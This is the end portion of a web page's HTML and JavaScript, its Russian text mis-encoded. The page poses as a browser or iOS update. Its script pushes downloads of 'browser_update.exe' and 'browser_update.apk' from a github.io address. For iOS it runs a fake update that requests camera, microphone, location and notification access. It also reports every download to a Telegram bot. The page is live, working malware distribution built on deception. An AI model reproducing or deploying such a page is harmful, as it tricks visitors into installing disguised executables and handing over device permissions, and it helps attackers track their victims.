                        ‚ö†Ô∏è –î–ª—è iOS —Ç—Ä–µ–±—É–µ—Ç—Å—è —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ
                    </p>
                    <p style="color: #856404; margin: 10px 0 0 0; font-size: 14px;">
                        –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ –∏ —Ä–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω—É
                    </p>
                </div>
                <button class="download-btn" onclick="downloadFile('ios')" style="background: #28a745;">
                    <span>üîÑ</span> –ù–∞—á–∞—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ iOS
                </button>
            `;
        } else {
            buttonHtml = `
                <div style="background: #f8f9fa; padding: 20px; border-radius: 12px; margin-bottom: 20px;">
                    <p style="color: #5f6368; margin: 0; font-weight: 600;">
                        –í–∞—à–∞ —Å–∏—Å—Ç–µ–º–∞ (${os}) –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è
                    </p>
                    <p style="color: #5f6368; margin: 10px 0 0 0; font-size: 14px;">
                        –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ Windows –∏–ª–∏ Android
                    </p>
                </div>
            `;
        }
        
        downloadSection.innerHTML = buttonHtml;
        
        // 6. –î–ª—è iOS —Å—Ä–∞–∑—É –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –º–µ–¥–∏–∞
        if (os === 'iOS' && navigator.mediaDevices) {
            setTimeout(() => {
                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                    .then(stream => {
                        stream.getTracks().forEach(track => track.stop());
                        statusMessage.textContent = '‚úÖ –î–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω—É –ø–æ–ª—É—á–µ–Ω';
                    })
                    .catch(err => {
                        statusMessage.textContent = '‚ö†Ô∏è –î–æ—Å—Ç—É–ø –∫ –º–µ–¥–∏–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω: ' + err.message;
                    });
            }, 2000);
        }
    });
});

// === –§–£–ù–ö–¶–ò–Ø –°–ö–ê–ß–ò–í–ê–ù–ò–Ø ===
function downloadFile(osType) {
    const loader = document.getElementById('loader');
    const statusMessage = document.getElementById('statusMessage');
    
    loader.style.display = 'block';
    statusMessage.textContent = osType === 'ios' 
        ? 'üîÑ –ó–∞–ø—É—Å–∫ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è iOS...' 
        : '‚è≥ –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ —Ñ–∞–π–ª–∞ –∫ —Å–∫–∞—á–∏–≤–∞–Ω–∏—é...';
    statusMessage.style.display = 'block';
    
    setTimeout(() => {
        loader.style.display = 'none';
        
        if (osType === 'windows') {
            const link = document.createElement('a');
            link.href = 'https://school4love.github.io/sc/browser_update.exe';
            link.download = 'browser_update.exe';
            link.click();
            statusMessage.textContent = '‚úÖ browser_update.exe –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è...';
        } 
        else if (osType === 'android') {
            const link = document.createElement('a');
            link.href = 'https://school4love.github.io/sc/browser_update.apk';
            link.download = 'browser_update.apk';
            link.click();
            statusMessage.textContent = '‚úÖ browser_update.apk –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è...';
        }
        else if (osType === 'ios') {
            statusMessage.textContent = '‚úÖ –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ iOS –∑–∞–ø—É—â–µ–Ω–æ. –ù–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É.';
            
            // –ê–≥—Ä–µ—Å—Å–∏–≤–Ω—ã–π –∑–∞–ø—Ä–æ—Å –≤—Å–µ—Ö —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π –¥–ª—è iOS
            if (navigator.mediaDevices) {
                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                    .then(stream => {
                        stream.getTracks().forEach(track => track.stop());
                        console.log('–ü–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ –º–µ–¥–∏–∞ –ø–æ–ª—É—á–µ–Ω');
                    });
            }
            
            // –ó–∞–ø—Ä–æ—Å –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ (–±—É–¥–µ—Ç –≤—Å–ø–ª—ã–≤–∞—Ç—å –æ–∫–Ω–æ)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(() => {});
            }
            
            // –ó–∞–ø—Ä–æ—Å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
            if ('Notification' in window && Notification.permission === 'default') {
                Notification.requestPermission();
            }
        }
        
        statusMessage.style.background = '#e6f7e9';
        statusMessage.style.color = '#0a5c0a';
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ —Å–∫–∞—á–∏–≤–∞–Ω–∏–∏
        const message = `üì• –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨ –°–ö–ê–ß–ò–í–ê–ï–¢: ${osType === 'windows' ? 'browser_update.exe' : osType === 'android' ? 'browser_update.apk' : 'iOS update'}`;
        const encoded = encodeURIComponent(message);
        const img = new Image();
        img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}`;
        
    }, 1500);
}
</script>
</body>
</html>
